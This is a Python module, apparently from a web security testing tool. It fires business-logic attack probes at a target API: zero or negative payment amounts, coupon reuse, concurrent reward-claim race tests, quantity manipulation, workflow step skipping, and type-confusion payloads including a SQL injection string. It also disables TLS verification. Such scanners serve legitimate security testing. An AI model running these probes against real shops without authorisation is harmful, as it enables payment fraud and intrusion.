"""
Business Logic Attacks Module
- Workflow bypass
- Race conditions
- Parameter manipulation
- Coupon/discount abuse
"""

import requests
import threading
import time
from typing import Dict, Any, List
import logging

logger = logging.getLogger(__name__)

class BusinessLogicAttackAnalyzer:
    """Analyze business logic vulnerabilities"""
    
    def __init__(self, base_url: str, token: str = None):
        self.base_url = base_url.rstrip('/')
        self.token = token
        self.headers = {'Authorization': f'Bearer {token}'} if token else {}
        self.headers['Content-Type'] = 'application/json'
        
    def test_payment_bypass(self) -> Dict[str, Any]:
        """Test payment processing bypass"""
        logger.info("[*] Testing payment processing bypass...")
        
        payloads = [
            {'amount': 0, 'currency': 'USD'},
            {'amount': -100},
            {'amount': '0.01'},
            {'price': 0},
            {'quantity': 0},
        ]
        
        for payload in payloads:
            try:
                resp = requests.post(
                    f"{self.base_url}/api/payment/process",
                    json=payload,
                    headers=self.headers,
                    timeout=5,
                    verify=False
                )
                
                if 'success' in resp.text.lower() or resp.status_code == 200:
                    logger.info(f"[+] Payment bypass possible with: {payload}")
                    return {
                        'vulnerable': True,
                        'technique': 'Payment Bypass',
                        'payload': payload
                    }
            except:
                pass
        
        return {'vulnerable': False}
    
    def test_coupon_abuse(self) -> Dict[str, Any]:
        """Test unlimited coupon reuse"""
        logger.info("[*] Testing coupon abuse...")
        
        try:
            # Test coupon reuse
            coupon_payload = {
                'coupon_code': 'DISCOUNT50',
                'amount': 100
            }
            
            results = []
            for i in range(3):
                resp = requests.post(
                    f"{self.base_url}/api/coupon/apply",
                    json=coupon_payload,
                    headers=self.headers,
                    timeout=5,
                    verify=False
                )
                
                if resp.status_code == 200:
                    results.append(resp.json())
                    logger.info(f"[+] Coupon reuse #{i+1} successful")
            
            if len(results) > 1:
                return {
                    'vulnerable': True,
                    'technique': 'Coupon Reuse',
                    'reuse_count': len(results)
                }
        except:
            pass
        
        return {'vulnerable': False}
    
    def test_race_condition(self, endpoint: str) -> Dict[str, Any]:
        """Test race condition vulnerabilities"""
        logger.info(f"[*] Testing race condition on {endpoint}...")
        
        successful_requests = []
        
        def make_request():
            try:
                resp = requests.post(
                    f"{self.base_url}{endpoint}",
                    json={'action': 'claim_reward'},
                    headers=self.headers,
                    timeout=5,
                    verify=False
                )
                if resp.status_code == 200:
                    successful_requests.append(resp.json())
            except:
                pass
        
        threads = []
        for i in range(5):
            t = threading.Thread(target=make_request)
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()
        
        if len(successful_requests) > 1:
            logger.info(f"[+] Race condition detected: {len(successful_requests)} concurrent claims")
            return {
                'vulnerable': True,
                'technique': 'Race Condition',
                'concurrent_success_count': len(successful_requests)
            }
        
        return {'vulnerable': False}
    
    def test_quantity_manipulation(self) -> Dict[str, Any]:
        """Test negative/unlimited quantity abuse"""
        logger.info("[*] Testing quantity manipulation...")
        
        payloads = [
            {'product_id': 1, 'quantity': -1},
            {'product_id': 1, 'quantity': 999999},
            {'product_id': 1, 'quantity': 0},
        ]
        
        for payload in payloads:
            try:
                resp = requests.post(
                    f"{self.base_url}/api/cart/add",
                    json=payload,
                    headers=self.headers,
                    timeout=5,
                    verify=False
                )
                
                if resp.status_code == 200:
                    logger.info(f"[+] Quantity manipulation accepted: {payload}")
                    return {
                        'vulnerable': True,
                        'technique': 'Quantity Manipulation',
                        'payload': payload
                    }
            except:
                pass
        
        return {'vulnerable': False}
    
    def test_workflow_bypass(self) -> Dict[str, Any]:
        """Test bypassing required workflow steps"""
        logger.info("[*] Testing workflow bypass...")
        
        # Try to skip steps
        try:
            # Step 1: Normally required
            # Skip to Step 3
            resp = requests.post(
                f"{self.base_url}/api/process/step3",
                json={'data': 'test'},
                headers=self.headers,
                timeout=5,
                verify=False
            )
            
            if resp.status_code == 200:
                logger.info(f"[+] Workflow bypass: Step 3 accessible without prerequisites")
                return {
                    'vulnerable': True,
                    'technique': 'Workflow Bypass',
                    'skipped_steps': ['step1', 'step2']
                }
        except:
            pass
        
        return {'vulnerable': False}
    
    def test_parameter_type_confusion(self) -> Dict[str, Any]:
        """Test parameter type confusion attacks"""
        logger.info("[*] Testing parameter type confusion...")
        
        type_payloads = [
            {'id': 'admin'},
            {'id': True},
            {'id': ['1', '2']},
            {'id': {'nested': 'value'}},
            {'amount': '100 UNION SELECT 1--'}
        ]
        
        for payload in type_payloads:
            try:
                resp = requests.post(
                    f"{self.base_url}/api/process",
                    json=payload,
                    headers=self.headers,
                    timeout=5,
                    verify=False
                )
                
                if resp.status_code == 200 and 'admin' in resp.text.lower():
                    logger.info(f"[+] Type confusion successful: {payload}")
                    return {
                        'vulnerable': True,
                        'technique': 'Type Confusion',
                        'payload': payload
                    }
            except:
                pass
        
        return {'vulnerable': False}
    
    def analyze(self) -> Dict[str, Any]:
        """Run full business logic analysis"""
        logger.info("[*] Starting business logic attack analysis...")
        
        results = {
            'payment_bypass': self.test_payment_bypass(),
            'coupon_abuse': self.test_coupon_abuse(),
            'race_condition': self.test_race_condition('/api/claim'),
            'quantity_manipulation': self.test_quantity_manipulation(),
            'workflow_bypass': self.test_workflow_bypass(),
            'type_confusion': self.test_parameter_type_confusion()
        }
        
        return results
